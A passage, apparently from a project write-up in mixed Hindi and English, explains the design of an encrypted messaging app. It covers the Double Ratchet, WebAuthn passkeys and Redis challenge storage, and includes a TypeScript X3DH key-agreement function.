PostgreSQL काम करता, पर SurrealDB की native live queries separate pub/sub layer की need eliminate करती हैं। Tradeoff newer database run करने की operational complexity है, पर real-time features के लिए developer experience significantly better है।\n\n**Skipped message key eviction strategy**: Double Ratchet को out of order arrive होने वाले messages के लिए keys store करनी होती हैं, पर unbounded storage DoS attacks enable करती है। Implementation FIFO eviction के साथ configurable maximum (1000 keys) use करती है, reliability और resource exhaustion के बीच balance करते हुए।\n\n**Discoverable credentials के साथ WebAuthn**: Passkeys resident/discoverable configure होती हैं, मतलब authenticator credential store करता है और user को username provide करने की need नहीं। यह platform authenticators वाले devices पर true single-gesture authentication enable करता है।\n\n**Signature counter verification**: हर WebAuthn authentication authenticator पर stored एक counter increment करता है। Server इसे track करता है और authentications reject करता है जहां counter increase नहीं होता, cloned authenticators detect करते हुए।\n\n**Atomic get-and-delete के साथ challenge storage के लिए Redis**: WebAuthn challenges single-use और time-limited होती हैं। Challenges atomically retrieve और delete करने के लिए Redis pipelines use करना race conditions के बिना replay attacks prevent करता है।\n\n```typescript\nasync function initiateX3DH(\n  identityKeyPair: IdentityKeyPair,\n  recipientBundle: PreKeyBundle\n): Promise<X3DHResult> {\n  const signatureValid = await verifySignedPreKey(\n    recipientBundle.identity_key,\n    recipientBundle.signed_prekey,\n    recipientBundle.signed_prekey_signature\n  )\n\n  if (!signatureValid) {\n    throw new Error(\"Invalid signed prekey signature\")\n  }\n\n  const ephemeralKeyPair = await generateX25519KeyPair()\n  const ephemeralPublic = await exportPublicKey(ephemeralKeyPair.publicKey)\n\n  const senderIdentityPrivate = await importX25519PrivateKey(\n    base64ToBytes(identityKeyPair.x25519_private)\n  )\n  const recipientIdentityPublic = await importX25519PublicKey(\n    base64ToBytes(recipientBundle.identity_key)\n  )\n  const recipientSignedPreKeyPublic = await importX25519PublicKey(\n    base64ToBytes(recipientBundle.signed_prekey)\n  )\n\n  const dh1 = await x25519DeriveSharedSecret(senderIdentityPrivate, recipientSignedPreKeyPublic)\n  const dh2 = await x25519DeriveSharedSecret(ephemeralKeyPair.privateKey, recipientIdentityPublic)\n  const dh3 = await x25519DeriveSharedSecret(ephemeralKeyPair.privateKey, recipientSignedPreKeyPublic)\n\n  let dhResults: Uint8Array[]\n  let usedOneTimePreKey = false\n\n  if (recipientBundle.one_time_prekey) {\n    const recipientOneTimePreKeyPublic = await importX25519PublicKey(\n      base64ToBytes(recipientBundle.one_time_prekey)\n    )\n    const dh4 = await x25519DeriveSharedSecret(ephemeralKeyPair.privateKey, recipientOneTimePreKeyPublic)\n    dhResults = [dh1, dh2, dh3, dh4]\n    usedOneTimePreKey = true\n  } else {\n    dhResults = [dh1, dh2, dh3]\n  }\n\n  const concatenated = concatBytes(...dhResults)\n  const sharedKey = await hkdfDerive(concatenated, EMPTY_SALT, X3DH_INFO, 32)\n\n  const senderIdentityPublic = base64ToBytes(identityKeyPair.x25519_public)\n  const recipientIdentityBytes = base64ToBytes(recipientBundle.identity_key)\n  const associatedData = concatBytes(senderIdentityPublic, recipientIdentityBytes)\n\n  return {\n    shared_key: sharedKey,\n    associated_data: associatedData,\n    ephemeral_public_key: bytesToBase64(ephemeralPublic),\n    used_one_time_prekey: usedOneTimePreKey,\n  }\n}\n```\n\nComplete X3DH sender flow: MITM attacks prevent करने के लिए signed prekey verify करें, fresh ephemeral keypair generate करें, one-time prekey availability के depending पर तीन या चार DH operations perform करें, concatenate करें और final shared secret के लिए HKDF से run करें। Associated data दोनों identity keys को encryption context में bind करती है key-compromise impersonation attacks prevent करते हुए।\n\n### Stack\nPython 3.13, FastAPI, SQLModel, PostgreSQL, SurrealDB, Redis, WebAuthn (py_webauthn), cryptography, SolidJS, TypeScript, Tailwind CSS, Nanostores, Web Crypto API, Docker, Nginx\n"
}
